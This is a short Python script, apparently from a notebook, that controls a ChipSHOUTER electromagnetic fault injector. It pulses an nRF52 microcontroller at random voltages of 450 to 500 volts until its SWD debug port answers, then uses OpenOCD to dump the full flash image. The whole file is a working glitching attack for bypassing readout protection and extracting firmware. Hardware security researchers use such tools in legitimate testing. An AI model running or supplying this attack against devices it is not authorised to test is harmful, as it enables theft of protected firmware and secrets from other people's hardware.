from chipshouter import ChipSHOUTER
import serial
from chipshouter.com_tools import Reset_Exception
import random
import subprocess
import time
import sys
from tqdm.notebook import trange, tqdm

cs = ChipSHOUTER('/dev/ttyUSB0')
cs.armed = 1
cs.mute = True
cs.pulse.repeat = 1
def test_swd():
    try:
        retval = subprocess.check_output(['openocd', '-f', '/interface/jlink.cfg', '-c', 'transport select swd;',  '-f', '/usr/local/share/openocd/scripts/target/nrf52.cfg', '-c', 'init;halt;dump_image nrf52_dumped2.bin 0x0 0x80000; exit'], stderr=subprocess.STDOUT)
        return b'processor detected' in retval
    except:
        return False

while True:
    try:
        cs.voltage = random.randint(450, 500)
        cs.pulse = 1
        #time.sleep(1) Adjust to needs; default is none
        if test_swd():
            print("!")
            sys.exit(0)
        else:
            print('.', end='', flush=True)
    except Reset_Exception:
        print("Device rebooted!")
        time.sleep(5) 



